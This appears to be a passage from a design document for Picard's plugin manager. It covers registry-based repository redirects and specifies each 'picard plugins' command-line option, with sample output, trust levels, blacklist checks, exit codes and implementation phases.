$ picard plugins --update lastfm
Updating lastfm...
Note: Repository has moved to https://github.com/metabrainz/picard-plugin-lastfm
Fetching from new location...
✓ Updated successfully
```

**List output:**

```bash
$ picard plugins --list

Installed Plugins:

  🛡️ lastfm (enabled)
    Version: 2.1.0
    Git URL: https://github.com/metabrainz/picard-plugin-lastfm
    Note: Repository moved from github.com/user/picard-plugin-lastfm
```

---

**Alternative: Manual migration command**

```bash
# User manually updates URL
$ picard plugins --migrate lastfm https://github.com/metabrainz/picard-plugin-lastfm

Migrating plugin 'lastfm' to new repository...
Old: https://github.com/user/picard-plugin-lastfm
New: https://github.com/metabrainz/picard-plugin-lastfm

This will:
- Update git remote URL
- Fetch from new location
- Preserve current ref and settings

Continue? [Y/n] y
✓ Migration complete
```

---

**Recommendation: Automatic redirects (Option 1)**

**Pros:**
- ✅ Transparent to users
- ✅ No manual intervention needed
- ✅ Works on next update
- ✅ Centrally managed in registry

**Cons:**
- ⚠️ Requires registry update
- ⚠️ Could be abused if registry compromised

**Safeguards:**
- Only follow redirects for plugins in registry
- Limit redirect chain length (prevent loops)
- Log all redirects clearly
- Show notification to user
- Require manual confirmation for unregistered plugins

---

**Config storage:**

```python
config.setting['plugins3']['installed_plugins']['lastfm'] = {
    'git_url': 'https://github.com/metabrainz/picard-plugin-lastfm',
    'original_url': 'https://github.com/user/picard-plugin-lastfm',  # Track original
    'redirected': True,
    'redirect_date': '2025-11-24T10:00:00Z'
}
```

---

**Edge cases:**

1. **Old repo still exists:**
   - Follow redirect anyway (registry is source of truth)
   - Old repo might be outdated

2. **New repo doesn't exist:**
   - Show error
   - Keep old URL
   - Notify user to check registry

3. **Circular redirects:**
   - Detect with hop limit
   - Show error
   - Use last known good URL

4. **Unregistered plugin moves:**
   - No automatic redirect (not in registry)
   - User must manually update URL
   - Or reinstall from new URL

---

**Impact:** Phase 3 (registry features)
**Recommendation:** Automatic redirects with safeguards
**Decision needed by:** Phase 3.1 (registry design)

---

## CLI Commands Reference

### Complete Command Line Interface

**Base command:** `picard plugins [OPTIONS]`

---

### Help Output

**Command:** `picard plugins --help`

**Output:**
```
usage: picard plugins [-h] [-l] [-i URL [URL ...]] [-u PLUGIN [PLUGIN ...]]
                      [-e PLUGIN [PLUGIN ...]] [-d PLUGIN [PLUGIN ...]]
                      [--update PLUGIN [PLUGIN ...]] [--update-all]
                      [--info NAME|URL] [--ref REF] [--switch-ref PLUGIN REF]
                      [--browse] [--search TERM] [--check-blacklist URL]
                      [--refresh-registry] [--check-updates] [--reinstall PLUGIN]
                      [--status] [-y] [--force-blacklisted] [--trust-community]
                      [--trust LEVEL] [--category CATEGORY] [--purge]

Manage Picard plugins (install, update, enable, disable)

options:
  -h, --help            show this help message and exit

Plugin Management:
  -l, --list            list all installed plugins with details
  -i URL [URL ...], --install URL [URL ...]
                        install plugin(s) from git URL(s) or by name
  -u PLUGIN [PLUGIN ...], --uninstall PLUGIN [PLUGIN ...]
                        uninstall plugin(s)
  -e PLUGIN [PLUGIN ...], --enable PLUGIN [PLUGIN ...]
                        enable plugin(s)
  -d PLUGIN [PLUGIN ...], --disable PLUGIN [PLUGIN ...]
                        disable plugin(s)
  --update PLUGIN [PLUGIN ...]
                        update specific plugin(s) to latest version
  --update-all          update all installed plugins
  --info NAME|URL       show detailed information about a plugin
  --status              show detailed status of all plugins (for debugging)

Git Version Control:
  --ref REF             git ref (branch, tag, or commit) to install/update to
  --switch-ref PLUGIN REF
                        switch plugin to different git ref without reinstalling

Plugin Discovery:
  --browse              browse official plugin registry
  --search TERM         search official plugins by name or description
  --check-blacklist URL
                        check if a plugin URL is blacklisted

Registry:
  --refresh-registry    force refresh of plugin registry cache
  --check-updates       check for available plugin updates

Advanced Options:
  --reinstall PLUGIN    force reinstall of plugin
  -y, --yes             skip all confirmation prompts (for automation)
  --force-blacklisted   install plugin even if blacklisted (DANGEROUS!)
  --trust-community     skip warnings for community plugins
  --trust LEVEL         filter plugins by trust level (picard_team, trusted_author, community)
  --category CATEGORY   filter plugins by category (metadata, coverart, ui, scripting, formats, other)
  --purge               delete plugin configuration when uninstalling

Examples:
  # List installed plugins
  picard plugins --list

  # Install plugin from URL
  picard plugins --install https://github.com/metabrainz/picard-plugin-lastfm

  # Install official plugin by name
  picard plugins --install lastfm

  # Install specific version
  picard plugins --install https://github.com/user/plugin --ref v1.0.0

  # Update all plugins
  picard plugins --update-all

  # Browse official plugins
  picard plugins --browse --category metadata

  # Search for plugins
  picard plugins --search "cover art"

  # Get plugin info
  picard plugins --info lastfm

  # Enable/disable plugins
  picard plugins --enable lastfm
  picard plugins --disable lastfm

  # Uninstall plugin
  picard plugins --uninstall lastfm

  # Uninstall and delete config
  picard plugins --uninstall lastfm --purge

Trust Levels:
  🛡️  picard_team      - Reviewed by Picard team (highest trust)
  ✓  trusted_author   - Known authors, not reviewed (high trust)
  ⚠️  community        - Other authors, not reviewed (use caution)
  🔓 unregistered     - Not in registry (developer testing or unknown source)

For more information, visit: https://picard.musicbrainz.org/docs/plugins/
```

---

### Commands Summary Table

| Command | Status | Priority | Phase | Description | Use Case |
|---------|--------|----------|-------|-------------|----------|
| `--list` / `-l` | ✅ Done | P0 | 1.3 | List all installed plugins | Check what's installed |
| `--install <url>` / `-i` | ✅ Done | P0 | 1.1 | Install plugin from git URL | Install new plugin |
| `--install <name>` | ⏳ TODO | P1 | 3.3 | Install official plugin by name | Easy install for users |
| `--uninstall <name>` / `-u` | ✅ Done | P0 | 1.1 | Uninstall plugin | Remove unwanted plugin |
| `--enable <name>` / `-e` | ✅ Done | P0 | 1.1 | Enable plugin | Activate plugin |
| `--disable <name>` / `-d` | ✅ Done | P0 | 1.1 | Disable plugin | Deactivate plugin |
| `--update <name>` | ⏳ TODO | P1 | 1.4 | Update specific plugin | Get latest version |
| `--update-all` | ⏳ TODO | P1 | 1.4 | Update all plugins | Bulk update |
| `--info <name\|url>` | ⏳ TODO | P1 | 1.3 | Show plugin details | Get plugin information |
| `--ref <ref>` | ⏳ TODO | P2 | 1.6 | Specify git ref (branch/tag/commit) | Install specific version |
| `--switch-ref <name> <ref>` | ⏳ TODO | P2 | 1.6 | Switch plugin to different ref | Change version |
| `--browse` | ⏳ TODO | P2 | 3.3 | Browse official plugins | Discover plugins |
| `--search <term>` | ⏳ TODO | P2 | 3.3 | Search official plugins | Find plugins |
| `--check-blacklist <url>` | ⏳ TODO | P1 | 1.8 | Check if URL is blacklisted | Verify safety |
| `--refresh-registry` | ⏳ TODO | P2 | 3.2 | Force refresh plugin registry cache | Update plugin list |
| `--check-updates` | ⏳ TODO | P2 | 1.4 | Check for available updates | See what's new |
| `--reinstall <name>` | ⏳ TODO | P2 | 1.7 | Reinstall plugin | Fix broken install |
| `--status` | ⏳ TODO | P2 | 1.5 | Show detailed plugin status | Debug plugin state |
| `--force-blacklisted` | ⏳ TODO | P1 | 1.8 | Override blacklist warning | Install despite warning |
| `--trust-community` | ⏳ TODO | P2 | 3.2 | Skip community plugin warnings | Batch operations |
| `--trust <level>` | ⏳ TODO | P2 | 3.3 | Filter by trust level | Browse by trust |
| `--category <cat>` | ⏳ TODO | P2 | 3.3 | Filter by category | Browse by type |
| `--yes` / `-y` | ⏳ TODO | P2 | 1.3 | Skip confirmation prompts | Automation |
| `--purge` | ⏳ TODO | P2 | 1.7 | Delete plugin config on uninstall | Clean removal |

**Legend:**
- ✅ Done: Implemented in phw/plugins-v3-cli
- ⏳ TODO: Needs implementation
- P0: Critical (blocker)
- P1: High priority
- P2: Medium priority

---

### Detailed Command Specifications

#### 1. List Plugins

**Command:** `picard plugins --list` or `picard plugins -l`

**Status:** ✅ Done (basic), ⏳ Needs enhancement

**Description:** List all installed plugins with status and details

**Current output (basic):**
```
example /path/to/plugin
```

**Enhanced output (Phase 1.3):**
```
Installed plugins:

  lastfm (enabled) 🛡️
    Version: 2.1.0
    Git ref: main @ a1b2c3d
    API: 3.0
    Trust: Picard Team
    Path: ~/.local/share/MusicBrainz/Picard/plugins3/lastfm
    Description: Scrobble your music to Last.fm

  discogs (disabled) ✓
    Version: 1.5.0
    Git ref: dev @ f4e5d6c
    API: 3.0, 3.1
    Trust: Trusted Author (Bob Swift)
    Path: ~/.local/share/MusicBrainz/Picard/plugins3/discogs
    Description: Discogs metadata provider

Total: 2 plugins (1 enabled, 1 disabled)
```

**Use cases:**
- Check what plugins are installed
- See which plugins are enabled
- Verify plugin versions
- Debug plugin issues

---

#### 2. Install Plugin

**Command:** `picard plugins --install <url>` or `picard plugins -i <url>`

**Status:** ✅ Done (basic)

**Description:** Install plugin from git repository URL

**Examples:**
```bash
# Install from GitHub
picard plugins --install https://github.com/metabrainz/picard-plugin-lastfm

# Install from GitLab
picard plugins --install https://gitlab.com/user/picard-plugin-custom

# Install from specific ref
picard plugins --install https://github.com/user/plugin --ref v1.0.0

# Install from specific branch
picard plugins --install https://github.com/user/plugin --ref dev
```

**Behavior:**
1. Check if URL is blacklisted
2. Clone git repository
3. Read and validate MANIFEST.toml
4. Check API version compatibility
5. Show trust level warning if needed
6. Install to plugins3 directory
7. Enable plugin (if user confirms)

**Use cases:**
- Install new plugin from URL
- Install plugin for testing
- Install third-party plugin

---

#### 3. Install Official Plugin (by name)

**Command:** `picard plugins --install <name>`

**Status:** ⏳ TODO (Phase 3.3)

**Description:** Install official plugin by name (no URL needed)

**Examples:**
```bash
# Install by name
picard plugins --install lastfm

# Install multiple
picard plugins --install lastfm discogs acoustid
```

**Behavior:**
1. Look up plugin name in registry
2. Get git URL from registry
3. Install as normal
4. No trust warning for official plugins

**Use cases:**
- Easy installation for users
- No need to know git URLs
- Install recommended plugins

---

#### 4. Uninstall Plugin

**Command:** `picard plugins --uninstall <name>` or `picard plugins -u <name>`

**Status:** ✅ Done

**Description:** Uninstall plugin and optionally remove config

**Examples:**
```bash
# Uninstall plugin (keep config)
picard plugins --uninstall lastfm

# Uninstall and delete config
picard plugins --uninstall lastfm --purge

# Uninstall multiple
picard plugins --uninstall lastfm discogs
```

**Behavior:**
1. Disable plugin if enabled
2. Remove plugin directory
3. Remove from config
4. Optionally delete plugin config (with --purge)

**Use cases:**
- Remove unwanted plugin
- Clean up after testing
- Free disk space

---

#### 5. Enable/Disable Plugin

**Commands:**
- `picard plugins --enable <name>` or `picard plugins -e <name>`
- `picard plugins --disable <name>` or `picard plugins -d <name>`

**Status:** ✅ Done

**Description:** Enable or disable installed plugin

**Examples:**
```bash
# Enable plugin
picard plugins --enable lastfm

# Disable plugin
picard plugins --disable lastfm

# Enable multiple
picard plugins --enable lastfm discogs acoustid
```

**Behavior:**
- Enable: Load module, call enable(), register hooks, save to config
- Disable: Call disable(), unregister hooks, save to config

**Use cases:**
- Temporarily disable plugin
- Enable plugin after install
- Toggle plugin for testing

---

#### 6. Update Plugin

**Commands:**
- `picard plugins --update <name>` - Update specific plugin
- `picard plugins --update-all` - Update all plugins

**Status:** ⏳ TODO (Phase 1.4)

**Description:** Update plugin to latest version from git

**Examples:**
```bash
# Update one plugin
picard plugins --update lastfm

# Update to specific ref
picard plugins --update lastfm --ref v2.0.0

# Update all plugins
picard plugins --update-all

# Check for updates without installing
picard plugins --check-updates
```

**Behavior:**
1. Fetch from git remote
2. Check for new commits/tags
3. Show what will change (version, commit)
4. Update (git pull / reset)
5. Reload plugin if enabled

**Use cases:**
- Get bug fixes
- Get new features
- Keep plugins current

---

#### 7. Plugin Info

**Command:** `picard plugins --info <name|url>`

**Status:** ⏳ TODO (Phase 1.3)

**Description:** Show detailed information about plugin

**Examples:**
```bash
# Info for installed plugin
picard plugins --info lastfm

# Info for plugin by URL (not installed)
picard plugins --info https://github.com/user/plugin
```

**Output:**
```
Plugin: Last.fm Scrobbler
Status: enabled
Version: 2.1.0
Author: MusicBrainz Picard Team
Trust Level: Picard Team 🛡️

Git Information:
  URL: https://github.com/metabrainz/picard-plugin-lastfm
  Ref: main
  Commit: a1b2c3d4e5f6 (2025-11-20)
  Message: Fix authentication bug

API Versions: 3.0
Category: metadata
License: GPL-2.0
License URL: https://www.gnu.org/licenses/gpl-2.0.html

Path: ~/.local/share/MusicBrainz/Picard/plugins3/lastfm

Description:
  Scrobble your music to Last.fm and update your listening history.
  Supports real-time scrobbling and batch submission.

Capabilities:
  ✓ Network access
  ✓ Read configuration
  ✓ Write configuration

Installed: 2025-11-15 10:30:00
Last Updated: 2025-11-20 14:15:00
```

**Use cases:**
- Check plugin details before install
- Verify plugin version
- See what plugin does
- Debug plugin issues

---

#### 8. Git Ref Management

**Commands:**
- `picard plugins --install <url> --ref <ref>` - Install specific ref
- `picard plugins --switch-ref <name> <ref>` - Switch to different ref
- `picard plugins --update <name> --ref <ref>` - Update to specific ref

**Status:** ⏳ TODO (Phase 1.6)

**Description:** Manage git branches, tags, and commits

**Examples:**
```bash
# Install from tag
picard plugins --install https://github.com/user/plugin --ref v1.0.0

# Install from branch
picard plugins --install https://github.com/user/plugin --ref dev

# Install from commit
picard plugins --install https://github.com/user/plugin --ref a1b2c3d4

# Switch to different branch
picard plugins --switch-ref myplugin dev

# Switch to tag
picard plugins --switch-ref myplugin v1.1.0

# Switch back to main
picard plugins --switch-ref myplugin main
```

**Use cases:**
- Test development versions
- Pin to specific version
- Beta testing
- Bisect bugs

---

#### 9. Browse Official Plugins

**Command:** `picard plugins --browse`

**Status:** ⏳ TODO (Phase 3.3)

**Description:** Browse official plugin registry

**Examples:**
```bash
# Browse all plugins
picard plugins --browse

# Browse by category
picard plugins --browse --category metadata

# Browse by trust level
picard plugins --browse --trust picard_team

# Browse Picard Team + Trusted Authors
picard plugins --browse --trust picard_team,trusted_author
```

**Output:**
```
Official Plugins:

Picard Team:
  🛡️ lastfm - Last.fm integration
     Version: 2.1.0 | Category: metadata
     Scrobble your music to Last.fm

  🛡️ acoustid - AcoustID fingerprinting
     Version: 1.5.0 | Category: metadata
     Identify files using audio fingerprints

Trusted Authors:
  ✓ discogs (Bob Swift) - Discogs metadata
     Version: 1.8.0 | Category: metadata
     Get metadata from Discogs database

Community:
  ⚠️ custom-tagger (John Doe) - Custom tagging rules
     Version: 0.5.0 | Category: metadata
     Apply custom tagging rules

Total: 4 plugins
```

**Use cases:**
- Discover new plugins
- See what's available
- Find plugins by category

---

#### 10. Search Plugins

**Command:** `picard plugins --search <term>`

**Status:** ⏳ TODO (Phase 3.3)

**Description:** Search official plugin registry

**Examples:**
```bash
# Search by name
picard plugins --search lastfm

# Search by keyword
picard plugins --search "cover art"

# Search in description
picard plugins --search scrobble
```

**Output:**
```
Search results for "cover art":

  🛡️ caa - Cover Art Archive
     Picard Team | Category: coverart
     Download cover art from Cover Art Archive

  ✓ fanart (Philipp Wolfer) - Fanart.tv cover art
     Trusted Author | Category: coverart
     Download cover art from Fanart.tv

Found 2 plugins
```

**Use cases:**
- Find specific plugin
- Search by functionality
- Discover related plugins

---

#### 11. Blacklist Check

**Command:** `picard plugins --check-blacklist <url>`

**Status:** ⏳ TODO (Phase 1.8)

**Description:** Check if plugin URL is blacklisted

**Examples:**
```bash
picard plugins --check-blacklist https://github.com/user/plugin
```

**Output (safe):**
```
✓ Plugin is not blacklisted
  URL: https://github.com/user/plugin
  Safe to install
```

**Output (blacklisted):**
```
⚠️  WARNING: This plugin is blacklisted!

  URL: https://github.com/badactor/malicious-plugin
  Reason: Contains malicious code
  Blacklisted: 2025-11-20

  DO NOT INSTALL this plugin.
```

**Use cases:**
- Verify plugin safety
- Check before installing
- Audit installed plugins

---

#### 12. Registry Management

**Commands:**
- `picard plugins --refresh-registry` - Force refresh cache
- `picard plugins --check-updates` - Check for updates

**Status:** ⏳ TODO (Phase 3.2)

**Description:** Manage plugin registry cache

**Examples:**
```bash
# Refresh registry cache
picard plugins --refresh-registry

# Check for plugin updates
picard plugins --check-updates
```

**Use cases:**
- Get latest plugin list
- Check for updates
- Troubleshoot registry issues

---

#### 13. Automation Flags

**Flags:**
- `--yes` / `-y` - Skip confirmation prompts
- `--force-blacklisted` - Override blacklist warning
- `--trust-community` - Skip community plugin warnings
- `--purge` - Delete config on uninstall
- `--reinstall` - Force reinstall

**Status:** ⏳ TODO (Phase 1.3, 1.7, 1.8)

**Description:** Flags for automation and advanced usage

**Examples:**
```bash
# Auto-confirm all prompts
picard plugins --install lastfm --yes

# Install blacklisted plugin (dangerous!)
picard plugins --install <url> --force-blacklisted

# Batch install community plugins
picard plugins --install plugin1 plugin2 --trust-community --yes

# Clean uninstall
picard plugins --uninstall plugin --purge

# Force reinstall
picard plugins --install <url> --reinstall
```

**Use cases:**
- Scripting/automation
- CI/CD pipelines
- Batch operations
- Advanced users

---

#### 14. Status and Debug

**Command:** `picard plugins --status`

**Status:** ⏳ TODO (Phase 1.5)

**Description:** Show detailed plugin state for debugging

**Output:**
```
Plugin Status Report:

lastfm:
  State: ENABLED
  Module: Loaded
  Hooks: 5 registered
  Config: 3 settings
  Last enabled: 2025-11-20 10:30:00

discogs:
  State: DISABLED
  Module: Loaded (not active)
  Hooks: 0 registered
  Config: 2 settings
  Last disabled: 2025-11-18 15:45:00

broken-plugin:
  State: ERROR
  Error: Failed to load module
  Details: ImportError: No module named 'missing_dependency'
```

**Use cases:**
- Debug plugin issues
- Check plugin state
- Troubleshoot problems

---

### Command Combinations

**Common workflows:**

```bash
# Discover and install
picard plugins --search "last.fm"
picard plugins --info lastfm
picard plugins --install lastfm

# Update workflow
picard plugins --check-updates
picard plugins --update-all

# Testing workflow
picard plugins --install <url> --ref dev
picard plugins --disable plugin
picard plugins --enable plugin
picard plugins --switch-ref plugin main

# Cleanup workflow
picard plugins --list
picard plugins --disable old-plugin
picard plugins --uninstall old-plugin --purge
```

---

### Exit Codes

| Code | Meaning |
|------|---------|
| 0 | Success |
| 1 | General error |
| 2 | Plugin not found |
| 3 | Network error |
| 4 | Git error |
| 5 | Blacklisted plugin |
| 6 | Incompatible API version |
| 7 | Invalid manifest |
| 8 | User cancelled |

---

### Implementation Priority

**Phase 1 (MVP):**
- ✅ --list (basic)
- ✅ --install <url>
- ✅ --uninstall
- ✅ --enable
- ✅ --disable
- ⏳ --update
- ⏳ --info
- ⏳ --check-blacklist
- ⏳ --yes

**Phase 2 (Enhanced):**
- ⏳ --ref
- ⏳ --switch-ref
- ⏳ --status
- ⏳ --reinstall
- ⏳ --purge
- ⏳ --check-updates

**Phase 3 (Registry):**
- ⏳ --install <name>
- ⏳ --browse
- ⏳ --search
- ⏳ --refresh-registry
- ⏳ --trust
- ⏳ --category

---
